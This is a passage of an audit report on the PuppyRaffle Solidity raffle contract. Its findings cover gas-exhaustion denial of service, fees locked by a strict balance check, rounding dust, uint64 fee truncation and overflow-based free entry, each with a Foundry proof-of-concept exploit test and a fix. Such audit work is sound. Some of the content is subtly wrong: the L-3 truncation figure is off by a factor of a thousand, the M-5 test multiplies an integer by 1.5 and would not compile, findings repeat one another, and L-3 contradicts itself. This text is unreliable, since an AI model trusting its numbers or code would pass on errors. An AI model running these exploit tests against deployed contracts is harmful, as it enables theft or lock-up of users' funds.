        assertTrue(gasUsedLarge > gasUsedSmall * 10, "gas did not explode as expected");
    }
}

## Suggested Mitigation
Maintain a mapping(address => bool) `isActivePlayer`.  When entering a raffle, check `require(!isActivePlayer[player])`, push the address, then set the mapping to true.  Upon refund or when the raffle is reset in selectWinner(), set the corresponding mapping value back to false.  This changes the duplicate check from O(n²) to O(1) per new player and completely removes the gas-growth vector.

## [M-2]. DOS issue in PuppyRaffle::enterRaffle

## Description
The `enterRaffle` function checks for duplicate players by iterating through the entire `players` array in a nested loop. This check occurs after new players have already been added to the array. The complexity of this check is O(n^2), where n is the total number of players. As the raffle grows, the gas cost of calling `enterRaffle` will increase quadratically. Eventually, the gas required will exceed the block gas limit, making it impossible for anyone to enter the raffle and effectively causing a permanent Denial of Service.

## Impact
The core functionality of the contract, entering the raffle, can be rendered unusable once a certain number of players have joined. This locks the contract, preventing further participation and potentially trapping the funds of existing players if the minimum player count for `selectWinner` is not yet met.

## Proof of Concept
1. Players begin to enter the raffle. The `players` array starts to grow.
2. As the number of entries reaches a few hundred, the gas cost for the O(n^2) duplicate check inside `enterRaffle` becomes significant.
3. For example, with 1000 players already in, adding one more player would require roughly 1000^2 / 2 = 500,000 comparisons, each consuming gas.
4. At a certain threshold of players, the total gas cost for a single `enterRaffle` transaction will exceed the Ethereum block gas limit.
5. At this point, any subsequent call to `enterRaffle` will fail with an 'out of gas' error, and no one else can join.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract PuppyRaffleGasDos is Test {
    PuppyRaffle raffle;
    uint256 constant FEE = 0.1 ether;

    function setUp() public {
        raffle = new PuppyRaffle(FEE, address(1), 1 days);
    }

    // Demonstrates that the quadratic duplicate-check eventually exhausts gas.
    function test_enterRaffleRunsOutOfGas() public {
        uint256 playersToAdd = 400; // 400 ⇒ ~80k pairwise comparisons each new join
        address[] memory batch = new address[](playersToAdd);
        for (uint256 i; i < playersToAdd; ++i) {
            batch[i] = address(uint160(i + 2));
            vm.deal(batch[i], FEE); // give each player entrance fee so prank works
        }

        // Add the first 400 players – succeeds with default gas limit
        vm.startPrank(batch[0]);
        raffle.enterRaffle{value: FEE * playersToAdd}(batch);
        vm.stopPrank();

        // Prepare one extra player
        address newPlayer = address(0xBEEF);
        vm.deal(newPlayer, FEE);
        address[] memory one = new address[](1);
        one[0] = newPlayer;

        // Forward only 5M gas to mimic main-net block limit; call should revert OOG
        vm.expectRevert();
        vm.prank(newPlayer);
        raffle.enterRaffle{value: FEE, gas: 5_000_000}(one);
    }
}

## Suggested Mitigation
The O(n^2) duplicate check should be replaced with a more gas-efficient mechanism. A mapping is ideal for this purpose. Add a mapping `mapping(address => bool) private isPlayer` to track active players. When a user enters, check this mapping. This reduces the check's complexity to O(1).

```solidity
// Add a new state variable
mapping(address => bool) private isPlayer;

function enterRaffle(address[] memory newPlayers) public payable {
    require(
        msg.value == entranceFee * newPlayers.length,
        "PuppyRaffle: Must send enough to enter raffle"
    );
    for (uint256 i = 0; i < newPlayers.length; i++) {
        address player = newPlayers[i];
        // FIX: Check for duplicates using a mapping for O(1) complexity
        require(!isPlayer[player], "PuppyRaffle: Duplicate player");
        players.push(player);
        isPlayer[player] = true;
    }
    emit RaffleEnter(newPlayers);
}

// Remember to update the `selectWinner` and `refund` functions to reset the mapping
// selectWinner():
// for (uint256 i = 0; i < players.length; i++) {
//     delete isPlayer[players[i]];
// }
// delete players;

// refund():
// isPlayer[playerAddress] = false;
```

## [M-3]. Unexpected Eth issue in PuppyRaffle::withdrawFees

## Description
The `withdrawFees` function uses a strict equality check on the contract's balance: `require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!")`. This check is intended to prevent fee withdrawal while a raffle is active. However, it can be easily broken. If any amount of Ether is sent to the contract address through other means (e.g., a simple transfer, or a `selfdestruct` from another contract), the contract's balance will no longer equal `totalFees`. This will cause the `require` statement to fail permanently, making it impossible to ever withdraw the collected fees.

## Impact
Legitimately collected fees can become permanently locked and irrecoverable in the contract. The owner will be unable to access their portion of the protocol's revenue.

## Proof of Concept
1. A raffle runs to completion. The `prizePool` is sent to the winner.
2. The contract now holds only the fee portion. For example, `totalFees` is 2 ether, and `address(this).balance` is also 2 ether. At this point, `withdrawFees` would succeed.
3. An attacker, or even an accidental user, sends 1 wei of ETH directly to the `PuppyRaffle` contract address.
4. The contract's balance is now `2 ether + 1 wei`.
5. The owner calls `withdrawFees()`.
6. The check `require(address(this).balance == uint256(totalFees), ...)` fails because `2 ether + 1 wei != 2 ether`.
7. This condition is permanent. The fees are now stuck in the contract forever.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract WithdrawFeesLockTest is Test {
    PuppyRaffle private raffle;
    uint256 constant ENTRANCE_FEE = 1 ether;
    address constant FEE_ADDRESS = address(0xBEEF);

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE_FEE, FEE_ADDRESS, 1 days);
    }

    function testWithdrawLock() public {
        // Prepare 4 unique players
        address p1 = address(0x1);
        address p2 = address(0x2);
        address p3 = address(0x3);
        address p4 = address(0x4);

        address[] memory batch = new address[](4);
        batch[0] = p1;
        batch[1] = p2;
        batch[2] = p3;
        batch[3] = p4;

        // Fund and enter raffle (p1 fronts the ETH)
        vm.deal(p1, 10 ether);
        vm.prank(p1);
        raffle.enterRaffle{value: ENTRANCE_FEE * 4}(batch);

        // Fast-forward so raffle can be settled and pick the winner
        vm.warp(block.timestamp + 1 days + 1);
        raffle.selectWinner();

        uint256 recordedFees = raffle.totalFees();
        assertEq(address(raffle).balance, recordedFees, "sanity check – recorded fees == balance");

        // An arbitrary sender dusts the contract with 1 wei
        address attacker = address(0xDEAD);
        vm.deal(attacker, 1 ether);
        vm.prank(attacker);
        (bool ok, ) = address(raffle).call{value: 1 wei}("");
        assertTrue(ok);
        assertEq(address(raffle).balance, recordedFees + 1, "extra wei should be present");

        // Owner can no longer withdraw
        vm.expectRevert(bytes("PuppyRaffle: There are currently players active!"));
        raffle.withdrawFees();
    }
}

## Suggested Mitigation
The check for withdrawing fees should not rely on the contract's exact balance. Instead, it should check if a raffle is currently inactive (e.g., `players.length == 0`). The amount to withdraw should be the stored `totalFees` amount, not the entire contract balance, to leave any extraneous ETH untouched.

```solidity
function withdrawFees() external {
    // A better check would be based on the raffle's state, not the balance.
    // If using the mapping-based entry system, you would check if the players array is empty.
    // Since the current implementation deletes the array, this check is tricky.
    // A simple fix is to remove the check and trust the owner, or make the check more robust.

    // A more robust check:
    require(players.length == 0, "PuppyRaffle: There are currently players active!");

    uint256 feesToWithdraw = uint256(totalFees);
    // To prevent re-entrancy, even though it's not a risk here
    totalFees = 0;

    (bool success, ) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```
It's important to note that with the current `refund` implementation (which creates zero-address holes), `players.length == 0` is only true after a raffle ends. A more robust system would use a dedicated `RaffleState` enum (`OPEN`, `CALCULATING`, `CLOSED`).

## [M-4]. Integer Overflow/Math issue in PuppyRaffle::selectWinner

## Description
The calculation of `prizePool` and `fee` in the `selectWinner` function uses integer division, which can lead to rounding errors. Specifically, `prizePool = (totalAmountCollected * 80) / 100` and `fee = (totalAmountCollected * 20) / 100`. If `totalAmountCollected` is not a multiple of 100, the remainders from both divisions are discarded. This results in `prizePool + fee < totalAmountCollected`, and the difference (dust) becomes permanently locked in the contract.

## Impact
Because of the rounding dust, the contract balance is always larger than the `totalFees` bookkeeping variable. The strict equality check in `withdrawFees()` (`address(this).balance == totalFees`) will therefore revert forever after the first raffle that produces dust. Consequently the owner can never withdraw the accumulated 20 % protocol fee, which will keep growing with every raffle. This permanently locks owner funds and breaks the economic model of the protocol.

## Proof of Concept
1. Deploy PuppyRaffle with `entranceFee = 99 wei`, `raffleDuration = 1`, `feeAddress = 0xdeadbeef...
2. Four externally owned accounts enter the raffle sending `99 wei` each.
3. Fast-forward time and call `selectWinner()`. One wei of dust remains in the contract while `totalFees` is 79 wei.
4. Call `withdrawFees()` – the call reverts because `address(this).balance (80)` is not equal to `totalFees (79)`.
5. All further raffles will add more fees but `withdrawFees()` will continue to revert, permanently freezing the protocol income.

## Proof of Code
pragma solidity ^0.7.6;
import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract RoundingDoSTest is Test {
    PuppyRaffle raffle;
    address constant FEE_ADDRESS = address(0xBEEF);
    uint256 constant ENTRANCE_FEE = 99;

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE_FEE, FEE_ADDRESS, /*raffleDuration*/ 1);
    }

    function testWithdrawFeesRevertsBecauseOfDust() public {
        // prepare four distinct players
        address[4] memory players = [address(1), address(2), address(3), address(4)];
        vm.deal(players[0], 1 ether);
        vm.deal(players[1], 1 ether);
        vm.deal(players[2], 1 ether);
        vm.deal(players[3], 1 ether);

        // enter raffle with 4 players
        address[] memory dynamic = new address[](4);
        for (uint256 i; i < 4; ++i) {
            dynamic[i] = players[i];
        }
        raffle.enterRaffle{value: ENTRANCE_FEE * 4}(dynamic);

        // finish raffle
        vm.warp(block.timestamp + 2);
        raffle.selectWinner();

        // sanity-check on-chain numbers
        assertEq(address(raffle).balance, 80, "balance should be fee(79)+dust(1)");
        assertEq(raffle.totalFees(), 79, "book-keeping misses the dust");

        // owner tries to withdraw fees
        vm.prank(raffle.owner());
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        raffle.withdrawFees();
    }
}

## Suggested Mitigation
Calculate one of the two amounts with subtraction so that 100 % of the collected ETH is distributed and `totalFees` matches the real balance:

```solidity
uint256 fee = (totalAmountCollected * 20) / 100;              // 20 % fee (will be <= exact value)
uint256 prizePool = totalAmountCollected - fee;               // takes the remainder

// OR make `fee` receive the remainder if that is preferable
// uint256 prizePool = (totalAmountCollected * 80) / 100;
// uint256 fee = totalAmountCollected - prizePool;
```

Additionally, change the invariant in `withdrawFees()` to `require(address(this).balance >= totalFees, ...)` (or remove it entirely) to avoid future fragility.

## [M-5]. Array Limits issue in PuppyRaffle::enterRaffle

## Description
The `enterRaffle` function contains a nested loop to check for duplicate players: `for (uint256 i = 0; i < players.length - 1; i++) { for (uint256 j = i + 1; j < players.length; j++) { ... } }`. This check has a quadratic complexity of O(n^2). As the number of players grows, the gas cost to enter the raffle increases quadratically. This will eventually make it prohibitively expensive or even exceed the block gas limit, preventing new users from joining.

## Impact
The primary function for participation, `enterRaffle`, can become unusable due to exorbitant gas costs, leading to a Denial of Service. This stops the raffle from growing and functioning as intended.

## Proof of Concept
1. The raffle runs for some time and accumulates a moderately large number of players (e.g., 2,000).
2. A new user attempts to call `enterRaffle` to join.
3. The transaction requires an extremely high amount of gas due to the O(n^2) loop checking for duplicates.
4. If the required gas exceeds the block gas limit, no one can enter the raffle anymore.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract PuppyRaffleEnterDosTest is Test {
    PuppyRaffle raffle;
    uint256 constant ENTRANCE_FEE = 1 ether;
    address constant FEE_ADDRESS = address(0xBEEF);

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE_FEE, FEE_ADDRESS, 1 days);
        // Give this test contract plenty of ether so it can pay entrance fees
        vm.deal(address(this), 10_000 ether);
    }

    function _seedPlayers(uint256 n) internal {
        address[] memory one = new address[](1);
        for (uint256 i; i < n; i++) {
            one[0] = address(uint160(uint256(keccak256(abi.encodePacked(i)))));
            raffle.enterRaffle{value: ENTRANCE_FEE}(one);
        }
    }

    function testGasGrowsSuperLinear() public {
        uint256[4] memory gasUsed;
        uint256[] memory checkpoints = new uint256[](4);
        checkpoints[0] = 50;
        checkpoints[1] = 100;
        checkpoints[2] = 150;
        checkpoints[3] = 200;

        for (uint256 k; k < checkpoints.length; k++) {
            // fresh raffle for each measurement
            raffle = new PuppyRaffle(ENTRANCE_FEE, FEE_ADDRESS, 1 days);
            vm.deal(address(this), 10_000 ether);
            _seedPlayers(checkpoints[k]);

            address[] memory newcomer = new address[](1);
            newcomer[0] = address(uint160(uint256(keccak256("newcomer"))));

            uint256 gasBefore = gasleft();
            raffle.enterRaffle{value: ENTRANCE_FEE}(newcomer);
            gasUsed[k] = gasBefore - gasleft();
        }

        assertTrue(gasUsed[1] > gasUsed[0] * 2, "> linear growth 50→100" );
        assertTrue(gasUsed[2] > gasUsed[1] * 1.5, "> linear growth 100→150");
        assertTrue(gasUsed[3] > gasUsed[2] * 1.5, "> linear growth 150→200");
    }
}

## Suggested Mitigation
Maintain a `mapping(address => bool) isPlayer` for O(1) duplicate checks.  Set `isPlayer[player] = true` when the address is added, set it back to `false` inside `refund`, and iterate over `players` once in `selectWinner` right before the array is deleted to clear the flag for every remaining player.  This removes all quadratic loops and allows refunded users to re-enter the same raffle without being blocked.



# Low Risk Findings

## [L-1]. Pausable Emergency Stop issue in PuppyRaffle::NA

## Description
The contract lacks an emergency stop or pause mechanism. If a critical vulnerability is discovered, the owner has no way to halt the contract's core functions, such as `enterRaffle` or `selectWinner`. This leaves the contract and its users' funds exposed until a fix can be deployed (which is not possible with this immutable contract).

## Impact
In the event of a critical bug, the inability to pause the contract can lead to continued exploitation and financial losses for users. The owner would be powerless to prevent further damage, harming the protocol's reputation and user trust.

## Proof of Concept
1. A critical vulnerability, such as the predictable randomness in `selectWinner`, is discovered and disclosed.
2. Malicious actors begin exploiting this vulnerability to unfairly win raffles.
3. Honest users, unaware of the exploit, continue to enter the raffle by sending ETH to the contract.
4. The contract owner, despite knowing about the vulnerability, has no function to call to pause new entries or stop the `selectWinner` function from being called, leading to further fund drainage.

## Proof of Code
// This is an architectural issue and does not have a PoC in code.
// The proof is the absence of a pause function.
// The following code demonstrates the fix, not the vulnerability.

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/security/Pausable.sol";

contract FixedPuppyRaffle is Ownable, Pausable {
    function enterRaffle(address[] memory newPlayers) public payable whenNotPaused {
        // ... logic
    }

    function selectWinner() external whenNotPaused {
        // ... logic
    }

    // Owner can pause the contract in case of emergency
    function pause() public onlyOwner {
        _pause();
    }

    function unpause() public onlyOwner {
        _unpause();
    }
}

## Suggested Mitigation
Implement a pausable mechanism to allow the owner to halt critical functions in an emergency. This can be easily achieved by inheriting from OpenZeppelin's `Pausable` contract and applying the `whenNotPaused` modifier to critical functions like `enterRaffle` and `selectWinner`.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/security/Pausable.sol";

contract PuppyRaffle is ERC721, Ownable, Pausable {
    // ...

    function enterRaffle(address[] memory newPlayers) public payable whenNotPaused {
        // ...
    }

    function selectWinner() external whenNotPaused {
        // ...
    }

    function refund(uint256 playerIndex) public whenNotPaused {
        // ...
    }

    // Add functions for owner to pause/unpause
    function pause() public onlyOwner {
        _pause();
    }

    function unpause() public onlyOwner {
        _unpause();
    }
}
```

## [L-2]. Event Consistency issue in PuppyRaffle::selectWinner, withdrawFees

## Description
Several critical state-changing functions in the contract do not emit events. Specifically, `selectWinner` finalizes a raffle, transfers the prize, and mints an NFT without emitting a dedicated event summarizing the outcome. Similarly, `withdrawFees` transfers all collected fees to the owner without emitting an event.

## Impact
The absence of events for critical operations makes it difficult for off-chain services, monitoring tools, and users to track the contract's activity. This lack of transparency complicates auditing, debugging, and building a reliable user interface or backend service that depends on the contract's state changes.

## Proof of Concept
1. An external monitoring service is set up to track all raffle winners and prize amounts.
2. The service listens for events from the `PuppyRaffle` contract.
3. When `selectWinner` is successfully called, no specific `WinnerSelected` event is emitted. 
4. The service must resort to complex and less reliable methods, like parsing transaction data or correlating ERC721 `Transfer` events with contract state reads, to determine who won and how much they received.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "src/PuppyRaffle.sol";

contract MissingEventTest is Test {
    PuppyRaffle raffle;
    address feeAddress = address(0xBEEF);

    function setUp() public {
        raffle = new PuppyRaffle(0.1 ether, feeAddress, 1); // entranceFee=0.1 eth, raffleDuration=1s

        // Prepare 4 unique players and fund this contract to pay their entry fees
        address[] memory addrs = new address[](4);
        addrs[0] = address(0x1);
        addrs[1] = address(0x2);
        addrs[2] = address(0x3);
        addrs[3] = address(0x4);

        vm.deal(address(this), 1 ether);
        raffle.enterRaffle{value: 0.4 ether}(addrs); // 4 * 0.1 ether

        // Fast-forward so the raffle is over
        vm.warp(block.timestamp + 2);
    }

    function testWinnerEventIsMissing() public {
        // Start recording logs that will be emitted during selectWinner
        vm.recordLogs();
        raffle.selectWinner();
        Vm.Log[] memory logs = vm.getRecordedLogs();

        // Topic for the expected (but missing) event
        bytes32 expectedTopic = keccak256("WinnerSelected(address,uint256,uint256)");
        bool found;
        for (uint256 i = 0; i < logs.length; i++) {
            if (logs[i].topics.length > 0 && logs[i].topics[0] == expectedTopic) {
                found = true;
                break;
            }
        }
        // The assertion passes only if the event is indeed missing
        assertTrue(!found, "WinnerSelected event unexpectedly present");
    }
} 

## Suggested Mitigation
Emit events for all critical state changes. This provides a transparent and reliable on-chain log of the contract's operations.

```solidity
// Add new events
event WinnerSelected(address indexed winner, uint256 prizeAmount, uint256 indexed tokenId);
event FeesWithdrawn(address indexed to, uint256 amount);

function selectWinner() external {
    // ... existing logic ...
    
    // Before _safeMint and prize transfer
    emit WinnerSelected(winner, prizePool, tokenId);

    (bool success, ) = winner.call{value: prizePool}("");
    require(success, "PuppyRaffle: Failed to send prize pool to winner");

    _safeMint(winner, tokenId);
}

function withdrawFees() external {
    // ... existing logic ...
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;

    emit FeesWithdrawn(feeAddress, feesToWithdraw);

    (bool success, ) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```

## [L-3]. Integer Overflow issue in PuppyRaffle::enterRaffle

## Description
The contract uses Solidity version 0.7.6, which does not have built-in protection against integer overflows and underflows. Several arithmetic operations are performed without using a safe math library.
1. In `enterRaffle`, `entranceFee * newPlayers.length` can overflow if `entranceFee` and `newPlayers.length` are large enough. This would wrap the result, allowing an attacker to enter many players for a very small `msg.value`.
2. In `selectWinner`, `players.length * entranceFee`, `totalAmountCollected * 80`, and `totalAmountCollected * 20` can all overflow.
3. Also in `selectWinner`, the raffle fee is cast from `uint256` to `uint64` before being added to `totalFees`. If the calculated fee exceeds the maximum value of a `uint64` (approx. 18.4 ether), it will be truncated, leading to incorrect fee accounting and a loss of funds for the fee recipient.

## Impact
The only practical arithmetic issue is the truncation that happens when `fee` is cast to `uint64` before being added to `totalFees`. Once the per-raffle fee exceeds 18.446 ether ( 2**64-1 wei ), the amount stored in `totalFees` wraps around modulo 2**64, leading to permanent loss of fees for the protocol owner. Players’ funds and the prize pool are not affected.

## Proof of Concept
1. Deploy `PuppyRaffle` with an `entranceFee` of 1 ether and `raffleDuration` of 1 day.
2. Enter 100 different addresses (100 ether in total).
3. Wait for the raffle to end and call `selectWinner`.
4. The correct fee should be 20 ether, but only `(uint64)(20 ether)` (= 0.001553… ether) is added to `totalFees`, proving the truncation/loss.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract FeeTruncationTest is Test {
    function testFeeTruncation() public {
        // Deploy raffle with 1 ether entrance fee
        PuppyRaffle raffle = new PuppyRaffle(1 ether, makeAddr("fee"), 1 days);

        // Prepare 100 unique players
        address[] memory addrs = new address[](100);
        for (uint256 i; i < 100; ++i) {
            addrs[i] = vm.addr(i + 1);
        }

        // Pay 100 ether to enter 100 players
        vm.deal(address(this), 120 ether);
        raffle.enterRaffle{value: 100 ether}(addrs);

        // Fast-forward so the raffle is over
        vm.warp(block.timestamp + 1 days + 1);

        // Select the winner (fee = 20 ether > 2**64-1 wei)
        raffle.selectWinner();

        uint256 expectedFee = 20 ether;
        uint256 storedFee   = raffle.totalFees();
        uint256 truncated   = uint256(uint64(expectedFee));

        // The fee recorded in contract must equal the truncated value and be < expectedFee
        assertEq(storedFee, truncated, "fee truncated");
        assertLt(storedFee, expectedFee, "loss of owner fees");
    }
}

## Suggested Mitigation
Change `totalFees` to `uint256` and remove the narrowing cast:

```solidity
// before
uint64  public totalFees;
...
uint64 feeU64 = uint64(fee);
totalFees += feeU64;

// after
uint256 public totalFees;
...
totalFees += fee; // no cast
```

If the project decides to stay on Solidity 0.7, consider importing OpenZeppelin’s `SafeMath` for all arithmetic; otherwise upgrade to ≥0.8.0 so that overflow/underflow checks are performed automatically.

## [L-4]. Integer Overflow issue in PuppyRaffle::enterRaffle, selectWinner

## Description
The contract uses Solidity version 0.7.6, which does not provide default protection against integer overflows or underflows. Multiple arithmetic operations are unsafe:
1. `enterRaffle`: `entranceFee * newPlayers.length` can overflow, allowing entry for a negligible cost.
2. `selectWinner`: `players.length * entranceFee` can overflow, causing incorrect prize calculations and locking the majority of funds in the contract.
3. `selectWinner`: `totalFees` is a `uint64` and is incremented by `uint64(fee)`. This can both truncate a large `fee` and cause `totalFees` to overflow, leading to a permanent DoS of the `withdrawFees` function.

## Impact
Because arithmetic is unchecked in Solidity 0.7.x, a malicious deployer (or an upgradeable implementation that later changes the entranceFee) can choose values that make multiplications overflow. This allows anyone to:
• enter the raffle without paying the required ether (entranceFee * n overflows to 0),
• mis-calculate prize / fee amounts, and
• truncate `totalFees` (uint64) once the total collected fees exceed 2^64-1.
The bug only becomes exploitable when the deployer selects an entranceFee that is deliberately close to 2^256-1 or when an implementation mistake later changes the fee to such a value. Therefore the issue is real but requires an unlikely mis-configuration.

## Proof of Concept
1. Deploy the contract with a huge entrance fee:
   entranceFee = (type(uint256).max / 2) + 1  
2. Prepare two player addresses `[A, B]`.
3. Call `enterRaffle{value:0}([A,B])`.  
   Calculation: entranceFee * 2 overflows to 0, so the `require` check passes, letting the attacker register the two players for free.
4. The same technique works for any `newPlayers.length` that makes the product overflow to the desired payable amount (including 0).

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract PuppyRaffleOverflowTest is Test {
    PuppyRaffle raffle;

    function setUp() public {
        uint256 hugeFee = type(uint256).max / 2 + 1; // will overflow when multiplied by 2
        raffle = new PuppyRaffle(hugeFee, address(this), 1 hours);
    }

    function test_freeEntryViaOverflow() public {
        address p1 = address(0x1);
        address p2 = address(0x2);
        address[] memory players = new address[](2);
        players[0] = p1;
        players[1] = p2;

        // call as an arbitrary user with 0 ether
        vm.prank(address(0xBEEF));
        raffle.enterRaffle{value: 0}(players);

        // verify that p1 is now registered without paying entranceFee
        uint256 idx = raffle.getActivePlayerIndex(p1);
        assertEq(idx, 0, "player should have been added for free");
    }
}

## Suggested Mitigation
Migrate to Solidity ^0.8.0 so that all arithmetic is checked by default, or import OpenZeppelin SafeMath for every arithmetic operation. In addition, change `totalFees` to `uint256` to avoid type-down-casting.



# Info Risk Findings

## [I-1]. Pragma issue in PuppyRaffle::NA

## Description
The contract is built using `pragma solidity 0.7.6;`, which is an outdated version of the Solidity compiler. Older versions may contain known bugs and vulnerabilities that have been patched in more recent releases. Furthermore, this version predates Solidity 0.8.0, which introduced crucial safety features like default overflow and underflow checks on arithmetic operations.

## Impact
Using an outdated compiler version increases the risk of the contract being susceptible to known compiler bugs. It also misses out on significant security enhancements, gas optimizations, and improved language features, making the contract less secure and efficient than it could be.

## Proof of Concept
N/A. This is a general best-practice finding. The risk is latent and depends on bugs present in the specific compiler version used. For example, the `IntegerOverflow` finding in this report is made more severe by the lack of default revert-on-overflow behavior in versions prior to 0.8.0.

## Proof of Code
// The vulnerability is the pragma line itself.

// In PuppyRaffle.sol:
// pragma solidity 0.7.6;

// This should be updated to a modern, stable version.

## Suggested Mitigation
It is strongly recommended to update the Solidity pragma to a more recent and stable version, such as `0.8.20` or higher. This will provide access to important security features like built-in overflow/underflow checks, as well as other compiler improvements and bug fixes.

```solidity
// Recommended change in PuppyRaffle.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
```



